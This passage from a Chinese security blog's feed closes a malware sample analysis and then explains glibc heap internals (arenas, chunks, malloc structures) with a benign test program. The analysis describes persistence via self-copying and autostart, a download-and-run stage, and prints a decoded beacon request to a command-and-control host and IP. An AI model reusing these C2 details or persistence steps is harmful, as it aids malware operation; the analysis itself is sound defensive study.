alt="image-20210523152003130"></p><p>接着调试，可以看到其实是做了一个copy自身到<code>C:\\intel\\msdtcv.exe</code>位置，下图可以看到内容结果</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/16.png" alt="image-20210521174629776"></p><p>我们接着看到火绒剑，可以看到CMD进行读写操作</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/17.png" alt="image-20210523155647085"></p><p>然后我们接着跟进到360行的<code>sub_404670</code>中，可以看到就这写入开机启动项</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/18.png" alt="image-20210523162935781"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/19.png" alt="image-20210523163026875"></p><p>接着往下看366行开始到412行都是获取系统相关内容</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/20.png" alt="image-20210523170708184"></p><p>接着跟到469行<code>sub_402BA0</code>函数为下载核心函数，由于服务器已经关了，无法动态分析，大概的内容就是下载函数到<code>C:\Users\ascotbe\AppData\Local\Microsoft\Windows</code>目录然后执行该函数</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/21.png" alt="image-20210523171312548"></p><p>由于不能分析返回以后的功能，那么我们回到423行，进入函数<code>sub_402890</code>分析请求了什么东西</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/22.png" alt="image-20210523171517787"></p><p>动态调试可以看到下图，微步获取到的ip为<strong>162.222.215.90</strong>和我获取到的不同，该进程应该是有个IP池（猜测），如果获取不到，就会换一个IP来请求</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/23.png" alt="image-20210523165338427"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/24.png" alt="image-20210523172312854"></p><p>通过解码得到如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;ourtyaz&#x2F;qwe.php?TIe&#x3D;4fc5fce9.8958.5:68.b76:.df147:ee9526*EFTLUPQ.V:OIKG8*22ACme;!7&#x2F;3&#x2F;:311! HTTP&#x2F;1.1</span><br><span class="line">Host: frameworksupport.net</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>那么分析就结束了，踩了好多坑，但是学到了挺多的东西很开心~</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/25.png" alt="image-20210523172602903"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux堆溢出总结（0x01）</title>
    <link href="https://www.ascotbe.com/2021/05/04/HeapOverflow_Linux_0x01/"/>
    <id>https://www.ascotbe.com/2021/05/04/HeapOverflow_Linux_0x01/</id>
    <published>2021-05-04T15:45:42.000Z</published>
    <updated>2021-07-30T15:37:26.603Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>HVV结束，终于能闲下来学习了，开新坑啦<del>好耶</del></p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/1.gif" alt="4E2FEA9B95DD08A1A4A30E8A3E4B9C63" style="zoom:33%;" /><blockquote><p>记个小知识点</p></blockquote><ul><li><p>libc是Linux下的ANSI C函数库。</p></li><li><p><a href="http://www.gnu.org/software/libc/">glibc</a>是Linux下的GUN C函数库。</p></li></ul><p>Linux下原来的标准c库Linux libc逐渐不再被维护。Linux下面的标准c库不仅有这一个，如uclibc、klibc，以及上面被提到的Linux libc，但是glibc无疑是用得最多的。glibc在/lib目录下的.so文件为libc.so.6。</p><h2 id="堆内存管理机制介绍"><a href="#堆内存管理机制介绍" class="headerlink" title="堆内存管理机制介绍"></a>堆内存管理机制介绍</h2><p>不同平台的堆内存管理机制不相同，下面是几个常见平台的堆内存管理机制：</p><table><thead><tr><th align="center">平台</th><th align="center">堆内存分配机制</th></tr></thead><tbody><tr><td align="center">General purpose allocator</td><td align="center">dlmalloc</td></tr><tr><td align="center">glibc</td><td align="center">ptmalloc2</td></tr><tr><td align="center">free BSD and Firefox</td><td align="center">jemalloc</td></tr><tr><td align="center">Google</td><td align="center">tcmalloc</td></tr><tr><td align="center">Solaris</td><td align="center">libumem</td></tr></tbody></table><p>在 Linux 的 <code>glibc</code> 使用的 <code>ptmalloc2</code> 实现原理。本来 Linux 默认的是 <code>dlmalloc</code>，但是由于其不支持多线程堆管理，所以后来被支持多线程的 <code>prmalloc2</code> 代替了。当然在 Linux 平台上的 <code>malloc</code> 函数本质上都是通过系统调用 <code>brk</code> 或者 <code>mmap</code> 实现的。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/2.png" alt="img"></p><p>进程的虚拟内存分布示意图(32位系统的进程虚拟内存分布)：</p><ul><li>在Linux 2.6.7之前的布局</li><li>堆只有1G虚拟空间</li></ul><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/3.png" alt="img"></p><p>任何应用都可以调用 Linux 的 <code>mmap</code> 系统调用，或者 Windows 的 <code>CreateFileMapping</code>/<code>MapViewOfFile</code>，向操作系统申请内存映射。内存映射是一个很方便、高效的做文件 IO 的方式, 所以一般用来加载动态链接库（dynamic libraries），也可以创建一块匿名的映射内存，不对应任何文件，在程序中使用。</p><p>进程的虚拟内存分布示意图(64位系统的进程虚拟内存分布)：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/19.png" alt="2"></p><h2 id="堆内存分配实验"><a href="#堆内存分配实验" class="headerlink" title="堆内存分配实验"></a>堆内存分配实验</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test_malloc.cpp</span></span><br><span class="line"><span class="comment">//clang++ -std=c++11 test_malloc.cpp -lpthread</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">ThreadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">pthread_t</span> t1;</span><br><span class="line">        <span class="keyword">void</span>* s;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, ThreadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="主线程-malloc-之前"><a href="#主线程-malloc-之前" class="headerlink" title="主线程 malloc 之前"></a>主线程 malloc 之前</h3><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/4.png" alt="image-20210505225640027"></p><p>可以看到，在本机上（Ubuntu16.04，x64），在主线程调用 <code>malloc</code> 之前，就已经给主线程分配了一块堆内存，这块<strong>默认大小的内存是 200 KB</strong>。</p><p>堆区内存位置是紧接着数据段的，并且<strong>offset</strong>的值为<strong>00000000</strong>，说明这个系统是通过 <code>brk</code> 进行内存分配的。</p><h3 id="主线程-malloc-之后"><a href="#主线程-malloc-之后" class="headerlink" title="主线程 malloc 之后"></a>主线程 malloc 之后</h3><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/5.png" alt="image-20210505231259039"></p><p>在主线程中调用 <code>malloc</code> 之后，发现 <strong>堆的大小仍然是 200K</strong>，因此 <code>malloc</code> 并没有引起堆区总容量的自增长。</p><div class="note info modern"><p>作者原文中有一种解释（32位）：还可以看出虽然我们只申请了1000bytes的数据，但是系统却分配了132KB大小的堆，这是为什么呢？原来这132KB的堆空间叫做<strong>arena</strong>，此时因为是主线程分配的，所以叫做<strong>main arena</strong>（每个<strong>arena</strong>中含有多个<strong>chunk</strong>，这些<strong>chunk</strong>以链表的形式加以组织)。由于132KB比1000bytes大很多，所以主线程后续再申请堆空间的话，就会先从这132KB的剩余部分中申请，直到用完或不够用的时候，再通过增加<strong>program break location</strong>的方式来增加<strong>main arena</strong>的大小。同理，当<strong>main arena</strong>中有过多空闲内存的时候，也会通过减小<strong>program break location</strong>的方式来缩小<strong>main arena</strong>的大小。</p></div><h3 id="主线程-free-之后"><a href="#主线程-free-之后" class="headerlink" title="主线程 free 之后"></a>主线程 free 之后</h3><p>主线程调用 <code>free</code> 之后，堆内存分布未发生改变</p><div class="note info modern"><p>原文也给出了解释（32位）：在主线程调用<code>free</code>之后，从内存布局可以看出程序的堆空间并没有被释放掉，因为调用<code>free</code>函数释放已经分配了的空间并非直接“返还”给系统，而是由<code>glibc</code>的<code>malloc</code>库函数加以管理。它会将释放的<strong>chunk</strong>（称为<strong>free chunk</strong>）添加到 <strong>main arena</strong> 的 <strong>bin</strong>（这是一种用于存储同类型<strong>free chunk</strong> 的双链表数据结构，后面会加以详细介绍）中。在这里，记录空闲空间的 <strong>free list</strong> 数据结构称之为 <strong>bins</strong>。之后当用户再次调用 <code>malloc</code> 申请堆空间的时候，<code>glibc</code>的 <code>malloc</code> 会先尝试从 <strong>bin</strong> 中找到一个满足要求的 <strong>chunk</strong> ，如果没有才会向操作系统申请新的堆空间。</p></div><h3 id="子线程-malloc-之前"><a href="#子线程-malloc-之前" class="headerlink" title="子线程 malloc 之前"></a>子线程 malloc 之前</h3><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/6.png" alt="image-20210506110331027"></p><p>红色框这一部分地址可以看出，<strong>在子线程 <code>malloc</code> 之前，已经创建了子线程的栈，或者说子线程创建时就在内存映射区上创建了该线程的栈空间，其默认大小是 8MB</strong>。</p><div class="note info modern"><p><strong>Linux 子线程是由 mmap 创建的，所以其栈是位于内存映射区区域</strong></p></div><h3 id="子线程-malloc-之后"><a href="#子线程-malloc-之后" class="headerlink" title="子线程 malloc 之后"></a>子线程 malloc 之后</h3><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/7.png" alt="image-20210506135215497"></p><p>在 <code>malloc</code> 之后，为子线程分配了堆区，这个大小是 132K，并且同样是位于内存映射区，这部分区域就是 thread1 的堆空间，即 thread1 的 <strong>arena</strong>。同时还要注意，子线程分配的空间是内存映射区向下增长的，也就是向堆区增长。</p><p>所以可以确定的是，<strong>子线程的堆栈都是分配在内存映射区和堆区之间的区域</strong>（也可以理解为就是分配在内存映射区，因为内存映射区和堆区都是动态增长的，内存映射区向下增长，堆区向上增长）。从虚拟内存的分布图中我们可以看到，在 3GB 的用户进程空间中，地址最高处的栈所占用的比较少（主线程的栈一般是 16MB 或者 8MB），然后内存映射区也不大，而初始化的堆区也很小。所以内存映射区和堆之间的区域是非常大的。</p><h3 id="子线程-free-之后"><a href="#子线程-free-之后" class="headerlink" title="子线程 free 之后"></a>子线程 free 之后</h3><p>同主线程类似，并没有立即回收。</p><h2 id="brk和mmap的区别"><a href="#brk和mmap的区别" class="headerlink" title="brk和mmap的区别"></a>brk和mmap的区别</h2><p>从操作系统角度来看，进程分配内存有两种方式，分别由两个系统调用完成：brk和mmap（不考虑共享内存）。</p><ul><li><p>brk是将数据段(.data)的最高地址指针_edata往高地址推；</p></li><li><p>mmap是在进程的虚拟地址空间中（堆和栈中间，称为<strong>文件映射区域</strong>的地方）找一块空闲的虚拟内存。</p></li></ul><p>这两种方式分配的都是<strong>虚拟内存</strong>，没有分配物理内存。在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系。</p><p>在标准C库中，提供了malloc/free函数分配释放内存，这两个函数底层是由brk，mmap，munmap这些系统调用实现的。</p><h2 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><strong>arena</strong>原本的翻译是竞技场，这个词非常巧妙的表现了堆中内存的管理的思路。前文提到，每个线程都有一个自己的<strong>arena</strong>用于堆内存的分配，这个区域是调用<code>malloc</code>的时候从操作系统获得的，一般情况下比实际<code>malloc</code>要大一些，当下次再次调用<code>malloc</code>，可以直接从<strong>arena</strong>中进行堆内存分配。</p><blockquote><p><strong>arena</strong>分为<strong>thread arena</strong>（可以包含多个 <strong>heap</strong>）和<strong>main arena</strong>（只包含一个可以自增长的 <strong>heap</strong>），每个<strong>heap</strong> 被分为多个 <strong>chunk</strong></p></blockquote><h3 id="arena-数量"><a href="#arena-数量" class="headerlink" title="arena 数量"></a>arena 数量</h3><p>对于不同系统，arena 数量的<a href="https://github.com/lattera/glibc/blob/master/malloc/arena.c#L888">约束</a>如下</p><table><thead><tr><th align="center">systems</th><th align="center">number of arena</th></tr></thead><tbody><tr><td align="center">32bits</td><td align="center">2 x number of cpu cores + 1</td></tr><tr><td align="center">64bits</td><td align="center">8 x number of cpu cores + 1</td></tr></tbody></table><h3 id="arena-管理"><a href="#arena-管理" class="headerlink" title="arena 管理"></a>arena 管理</h3><p>假设有如下情景：一台只含有一个处理器核心的机器安装有 32 位操作系统，其上运行了一个多线程应用程序，共含有 4 个线程——主线程和三个子线程。显然线程个数大于系统能维护的最大 <strong>arena</strong> 个数（2 x 核心数 + 1= 3），那么此时 <code>glibc</code> 的 <code>malloc</code> 就需要确保这 4 个线程能够正确地共享这 3 个 <strong>arena</strong>，那么它是如何实现的呢？</p><p>当主线程首次调用 <code>malloc</code> 的时候会直接为它分配一个 <strong>main arena</strong>，而不需要任何附加条件。</p><p>当子线程 1 和子线程 2 首次调用 <code>malloc</code> 的时候，<code>glibc</code> 实现的 <code>malloc</code> 会分别为每个子线程创建一个新的 <strong>thread arena</strong>。此时，各个线程与 <strong>arena</strong> 是一一对应的。但是，当用户线程 3 调用 <code>malloc</code> 的时候就出现问题了。因为此时 <code>glibc</code> 的 <code>malloc</code> 能维护的 <strong>arena</strong> 个数已经达到上限，无法再为子线程 3 分配新的 <strong>arena</strong> 了，那么就需要重复使用已经分配好的 3 个 <strong>arena</strong> 中的一个（<strong>main arena</strong>, <strong>arena1</strong> 或者 <strong>arena2</strong>）。那么该选择哪个 <strong>arena</strong> 进行重复利用呢？<code>glibc</code> 的 <code>malloc</code> 遵循以下规则：</p><ol><li>首先循环遍历所有可用的 <strong>arena</strong>，在遍历的过程中，它会尝试加锁该 <strong>arena</strong>。如果成功加锁（该 <strong>arena</strong> 当前对应的线程并未使用堆内存则表示可加锁），比如将 <strong>main arena</strong> 成功锁住，那么就将 <strong>main arena</strong> 返回给用户，即表示该 <strong>arena</strong> 被子线程 3 共享使用。</li><li>如果没能找到可用的 <strong>arena</strong>，那么就将子线程 3 的 <code>malloc</code> 操作阻塞，直到有可用的 <strong>arena</strong> 为止。</li><li>如果子线程 3 再次调用 <code>malloc</code> 的话（第二次使用arena），<code>glibc</code> 的 <code>malloc</code> 就会先尝试使用最近访问的 <strong>arena</strong>（此时为 <strong>main arena</strong>）。如果此时 <strong>main arena</strong> 可用的话，就直接使用，否则就将子线程 3 阻塞，直到 <strong>main arena</strong> 再次可用为止（为了防止开销过大问题）。</li></ol><h2 id="堆的数据结构"><a href="#堆的数据结构" class="headerlink" title="堆的数据结构"></a>堆的数据结构</h2><p>在 <code>glibc</code> 的 <code>malloc</code> 中针对堆管理，主要涉及到以下 3 种数据结构</p><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>我们把从操作系统申请的一块内存称为一个 <strong>heap</strong>，这个 <strong>heap</strong> 的信息就是用 <code>heap_info</code> 表示，也称为 <strong>heap header</strong>，因为一个 <strong>thread arena</strong>（注意：不包含主线程）可以包含多个 <strong>heap</strong>，所以为了便于管理，就给每个 <strong>heap</strong> 用一个 <code>heap_info</code> 表示。</p><blockquote><p>此处的 <strong>heap</strong> 并非广义上的进程的虚拟内存空间中的堆，而是子线程通过系统调用 <code>mmap</code> 从操作系统申请的一块内存空间，后面 <strong>heap</strong> 不做声明，均是这个意思。同时我们把主线程的 <strong>main arena</strong> 的那个区域也成为 <strong>heap</strong>，这种称呼也是对的，二者功能相同，只不过位置不同，但是 <strong>main arena</strong> 中只包含一个可以自增长的 <strong>heap</strong>。</p></blockquote><p>那么在什么情况下一个 <strong>thread arena</strong> 会包含多个 <strong>heap</strong> 呢？在当前 <strong>heap</strong> 不够用的时候，<code>malloc</code> 会通过系统调用 <code>mmap</code> 申请新的 <strong>heap</strong>（这部分空间本来是位于内存映射区区域），新的 <strong>heap</strong> 会被添加到当前 <strong>thread arena</strong> 中，便于管理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr;                <span class="comment">/* arena for this heap. */</span> <span class="comment">/*这堆的竞技场。*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span>      <span class="comment">/* Previous heap. */</span> <span class="comment">/*以前的堆。*/</span></span><br><span class="line">  <span class="keyword">size_t</span> size;                  <span class="comment">/* Current size in bytes. */</span> <span class="comment">/*当前大小以字节为单位。*/</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size;         <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                                   PROT_READ|PROT_WRITE.  */</span> <span class="comment">/*以mprotectated的字节的大小*/</span></span><br><span class="line">   <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">      that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">      MALLOC_ALIGNMENT. */</span> <span class="comment">/*确保以下数据正确对齐*/</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p><code>malloc_state</code> 用于表示 <strong>arena</strong> 的信息，因此也被称为 <strong>arena header</strong>，每个线程只含有一个 <strong>arena header</strong>。<strong>arena header</strong> 包含 <strong>bin</strong>、<strong>top chunk</strong> 以及 <strong>last remainder chunk</strong> 等信息，这些概念会在后文详细介绍。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span> <span class="comment">/*序列化访问。*/</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span> <span class="comment">/*标志（以前在max_fast）。*/</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span> <span class="comment">/*快速的bins*/</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>  <span class="comment">/*最顶层块的基础 - 没有以其他方式保存在垃圾箱里*/</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span> <span class="comment">/*剩余的来自小型请求的最新分裂*/</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span> <span class="comment">/*如上所述包装正常箱*/</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span> <span class="comment">/*bins的位图*/</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span> <span class="comment">/*链接名单*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span> <span class="comment">/*免费竞技场的链表。*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span> <span class="comment">/*在此竞技场中分配的内存。*/</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>为了便于管理和更加高效的利用内存，一个 <strong>heap</strong> 被分为多个 <strong>chunk</strong>，每个 <strong>chunk</strong> 的大小不是固定，是根据用户的请求决定的，也就是说用户调用 <code>malloc(size_t size)</code> 传递的 <code>size</code> 参数就是 <strong>chunk</strong> 的大小（这种表示并不准确，但是为了方便理解就暂时这么描述了，详细说明见后文）。每个 <strong>chunk</strong> 都由一个结构体 <code>malloc_chunk</code> 表示，也成为 <strong>chunk header</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  <span class="comment">/* #define INTERNAL_SIZE_T size_t */</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span> <span class="comment">/*之前块的大小*/</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span> <span class="comment">/*大小以字节为单位，包括开销*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. 这两个指针只在free chunk中存在*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="comment">/*仅用于大块：指向下一个更大的尺寸*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>关于上述的三种结构，基本都是针对子线程的，主线程和子线程有一些不同：</p><ol><li>主线程的堆不是分配在内存映射区，而是进程的虚拟内存堆区，因此不含有多个 <strong>heap</strong> 所以也就不含有 <code>heap_info</code> 结构体。当需要更多堆空间的时候，直接通过增长 <code>brk</code> 指针来获取更多的空间，直到它碰到内存映射区域为止。</li><li>不同于 <strong>thread arena</strong>，主线程的 <strong>main arena</strong> 的 <strong>arena header</strong> 并不在堆区中，而是一个全局变量，因此它属于 <code>libc.so</code> 的 data segment 区域。</li><li><strong>heap</strong>的结构体<code>heap_info</code>，<strong>arena</strong>的结构体<code>malloc_state</code>，<strong>chunk</strong>的结构体<code>malloc_chunk</code></li></ol><h2 id="heap-与-arena-的关系"><a href="#heap-与-arena-的关系" class="headerlink" title="heap 与 arena 的关系"></a>heap 与 arena 